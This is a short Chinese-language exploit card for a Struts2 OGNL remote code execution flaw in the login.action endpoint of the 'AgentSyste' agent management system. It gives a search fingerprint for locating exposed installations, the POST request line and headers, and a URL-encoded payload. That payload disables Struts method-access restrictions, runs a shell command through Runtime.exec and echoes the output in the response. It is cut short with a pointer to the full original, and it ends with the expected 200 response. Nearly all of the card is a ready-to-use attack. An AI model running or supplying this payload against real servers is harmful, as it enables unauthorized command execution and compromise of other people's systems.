# AgentSyste代理商管理系统login.actionStruts2远程代码执行漏洞

- **系统**：AgentSyste　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="AgentSyste代理商管理系统"`
- **请求**：`POST /login.action HTTP/1.1`
- **关键头**：`Content-Length: 629`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
debug=command&expression=%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22ls%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxo…（脚本共 629 字，完整版见原文）
```
- **预期**：200　|　www